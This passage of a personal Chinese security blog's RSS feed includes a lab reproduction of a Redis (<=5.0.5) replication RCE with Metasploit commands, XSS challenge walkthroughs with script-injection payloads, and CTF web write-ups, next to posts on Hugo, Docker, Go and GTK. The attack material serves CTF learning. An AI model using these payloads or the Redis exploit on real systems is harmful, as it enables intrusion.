msfconsole set RHOST &amp;lt;ip&amp;gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。
Pavel Toporkov的分享:
15-redis-post-exploitation.pdf (zeronights.ru)
影响版本 Redis &amp;lt;= 5.0.5
复现思路 漏洞复现 环境搭建:
docker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:
n0b0dyCN/redis-rogue-server: Redis(&amp;lt;=5.0.5) RCE (github.com)</description>
    </item>
    
    <item>
      <title>博客搭建</title>
      <link>https://oopsdc.tk/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Sat, 12 Jun 2021 12:29:53 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
      <description>博客搭建 hugo Hugo官方网站：
https://gohugo.io
本文以PaperMod主题为例，官方文档：
Installation · adityatelange/hugo-PaperMod Wiki (github.com)
需求准备 Hugo：
Releases · gohugoio/hugo (github.com)
安装步骤 1.解压压缩包 2.配置环境变量 D:\Env\hugo_0.83.13.初始化博客 官方文档推荐我们使用易读性更高的yml格式初始化博客。
hugo new site &amp;lt;name of site&amp;gt; -f yml4.指定主题 在config.yml文件中设置主题。
theme: PaperMod5.本地启动 先在本地看看网站跑起来的效果
hugo server6.创建GitHub仓库 具体操作详见之后的hexo主题教学。
7.修改baseUrl 将config.yml文件中的baseUrl修改为刚刚创建的仓库。
baseURL: &amp;quot;https://&amp;lt;username&amp;gt;.github.io/&amp;quot;8.生成public文件夹 public中包含所有静态页面的内容，我们需要生成这个文件夹并上传到远程仓库中，完成博客部署。
hugo9.push到远程仓库 # 配置代理 git config --global http.proxy socks5://127.0.0.1:&amp;lt;port&amp;gt; git config --global https.proxy socks5://127.0.0.1:&amp;lt;port&amp;gt; # 更改默认分支 git push -u origin main # push文件 cd public git init git add .</description>
    </item>
    
    <item>
      <title>XSS Challenges</title>
      <link>https://oopsdc.tk/post/xss-challenges/</link>
      <pubDate>Thu, 10 Jun 2021 21:03:39 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/xss-challenges/</guid>
      <description>题目地址:https://xss-quiz.int21h.jp/
Stage #1  Hint: Very simple&amp;hellip;
 直接输入测试语句:
&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; Stage #2  Hint: Close the current tag and add SCRIPT tag&amp;hellip;
 地址:XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)
上测试语句:
&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; 然后审查元素，只需要把input标签闭合就能执行我们的语句了。
&amp;#34;&amp;gt;&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; Stage #3  Hint: The input in text box is properly escaped.
 地址:XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)
这个页面有两个input标签，先在搜索框输入我们的测试语句试试。
直接把我们的语句放到&amp;lt;b&amp;gt;标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。
Stage #4  Hint: Invisible input field.
 地址:XSS Challenges (by yamagata21) - Stage #4 (int21h.</description>
    </item>
    
    <item>
      <title>Test</title>
      <link>https://oopsdc.tk/post/test/</link>
      <pubDate>Fri, 28 May 2021 21:03:39 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/test/</guid>
      <description>He11o, th1s 1s a test!
#include &amp;lt;stdio.h&amp;gt;int main() { pritnf(&amp;#34;Hello World!&amp;#34;); }  本文链接:Test | Atmet (oopsdc.tk)
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>网站镜像克隆</title>
      <link>https://oopsdc.tk/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/</link>
      <pubDate>Tue, 20 Apr 2021 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/</guid>
      <description>使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。
操作命令及参数解释如下：
wget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m	:	镜像，选择该选项适用于Web站点 -p	:	页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E	:	适用于拓展，可以在本地另存一个html文件 -k	:	转换链接，确保文件本转换，适用于本地浏览 -K	:	转换备份文件，将以orig为后缀作为原始文件 -np	:	不要到上一层子目录中 -v	:	显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.</description>
    </item>
    
    <item>
      <title>Docker</title>
      <link>https://oopsdc.tk/post/docker/</link>
      <pubDate>Tue, 13 Apr 2021 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/docker/</guid>
      <description>Docker概述 镜像(image)：
一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。容器(container)：
Docker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。容器可以被启动、开始、停止、删除。每个容器都是相互个隔离的。也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。仓库(repository)：
仓库是集中存放镜像文件的场所。仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。仓库分为公开仓库和私有仓库两种形式。最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。Docker安装  环境:CentOS 7
 1.官方文档
2.yum安装gcc相关环境
yum -y install gcc yum -y install gcc-c++ 3.卸载旧版本
yum remove docker \ 	docker-client \ 	docker-client-latest \ 	docker-common \ 	docker-latest \ 	docker-latest-logrotate \ 	docker-logrotate \ 	docker-engine 4.安装依赖包
yum install -y yum-utils 5.设置镜像仓库
# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.</description>
    </item>
    
    <item>
      <title>Golang</title>
      <link>https://oopsdc.tk/post/golang/</link>
      <pubDate>Tue, 13 Apr 2021 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/golang/</guid>
      <description>runoob教程:Go 语言教程 | 菜鸟教程 (runoob.com)
环境搭建 安装包官方下载地址:Downloads - The Go Programming Language (golang.org)
国内能打开的地址:Downloads - The Go Programming Language (google.cn)
Windows安装go 安装包下载 这里我选择下载msi文件的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\Env\go1.16.2\bin下解压。
环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。
检测安装 打开cmd输入go。
hello-world 在工作目录创建hello.go文件。
package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;Hello, World!&amp;#34;) } 使用go run命令运行:
go run hello.go go build生成二进制文件运行:
&amp;gt; go build .\hello.go &amp;gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.go &amp;gt; .</description>
    </item>
    
    <item>
      <title>GTK&#43;</title>
      <link>https://oopsdc.tk/post/gtk&#43;/</link>
      <pubDate>Sat, 27 Mar 2021 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/gtk&#43;/</guid>
      <description>GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。
GTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.
学习手册  GTK+2手册:GTK+ 2 Reference Manual - GNOME Developer Center GTK+3手册:GTK+ 3 Reference Manual - GNOME Developer Center 中文手册:介绍 - 《GTK+3 参考手册》 - 书栈网 · BookStack  GTK程序简介  使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译
 例: gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include &amp;lt;gtk/gtk.h&amp;gt; int main(int argc, char *argv[]) { gtk_init(&amp;amp;argc, &amp;amp;argv);	// 初始化  // 代码区  gtk_main();	// 主事件循环  return 0; } 分析:</description>
    </item>
    
    <item>
      <title>My 1st post</title>
      <link>https://oopsdc.tk/post/my-1st-post/</link>
      <pubDate>Tue, 15 Sep 2020 11:30:03 +0000</pubDate>
      
      <guid>https://oopsdc.tk/post/my-1st-post/</guid>
      <description>Desc Text.</description>
    </item>
    
    <item>
      <title>Bugku</title>
      <link>https://oopsdc.tk/post/bugku/</link>
      <pubDate>Mon, 13 Apr 2020 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/bugku/</guid>
      <description>Bugku Web Web1  Des:flag{}。
 查看源码即可。
Web2  Des:输入验证码即可得到flag。
 输入框有输入长度限制，在控制台修改长度即可。
Web3  Des:flag{}。
 通过get传参，按照题目要求直接传入
?what=flagWeb4  Des:post。
 方法1 利用hackbar直接post传参。
方法2 利用burp抓包传值。
方法3 编写python脚本。
import requests s = requests.Session() r = s.get(&amp;#34;&amp;lt;url&amp;gt;&amp;#34;) value = {&amp;#39;what&amp;#39;:&amp;#39;flag&amp;#39;} r = s.post(&amp;#34;&amp;lt;url&amp;gt;&amp;#34;, value) print(r.text) 题目更新  Des:看看源代码吧。
 查看源代码，发现有两串编码字符串。
分别对两个字符串进行URL解码：
按照代码含义将其组合起来：
放到控制台Console里排版。
将if判断里与a.value判等的值输入提交框，提交。
获得flag。
Web5  Des:矛盾。
 $num = $_GET[&amp;#39;num&amp;#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo &amp;#39;flag{********}&amp;#39;; } 利用1a绕过，例：</description>
    </item>
    
    <item>
      <title>攻防世界</title>
      <link>https://oopsdc.tk/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</link>
      <pubDate>Fri, 03 Jan 2020 22:06:50 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</guid>
      <description>攻防世界 Web view source  Des:X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。
 查看页面源码。
获得flag。
robots  Des:X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。
 在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。
获得flag。
backup  Des:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
 尝试backup.php，无效。
使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。
获得flag。
cookie  Des:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？
 使用burp抓包，得到cookie.php。
继续使用burp抓包，查看Response。
获得flag。
disable_button  Des:N/A。
 页面的flag按钮无响应，猜测被禁用，查看控制台元素。
&amp;lt;input class=&amp;quot;btn btn-default&amp;quot; disabled&amp;gt;
将此处的disabled前三字符删除，改为abled，按下按钮。
获得flag。
weak_auth  Des:小宁写了一个登陆验证页面，随手就设了一个密码。
 查看源码。
&amp;lt;from class=&amp;quot;form-inline&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;./check.php&amp;quot;&amp;gt;
有一个验证页面，访问它。
页面空白，查看源码，提示。
&amp;lt;!--maybe you need a dictionary--&amp;gt;
这道题或许不需要字典？
尝试御剑扫描，无果。
好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确&amp;hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。
获得flag。
simple_php  Des:小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。
 &amp;lt;?php show_source(__FILE__); include(&amp;#34;config.php&amp;#34;); $a = @$_GET[&amp;#39;a&amp;#39;]; $b = @$_GET[&amp;#39;b&amp;#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b &amp;gt; 1234) { echo $flag2; } ?</description>
    </item>
    
    
    <item>
      <title>Links</title>
      <link>https://oopsdc.tk/links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://oopsdc.tk/links/</guid>
      <description>links</description>
    </item>
    
    
    <item>
      <title>Tag</title>
      <link>https://oopsdc.tk/tags/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://oopsdc.tk/tags/</guid>
      <description>tags</description>
    </item>
    
  </channel>
</rss>
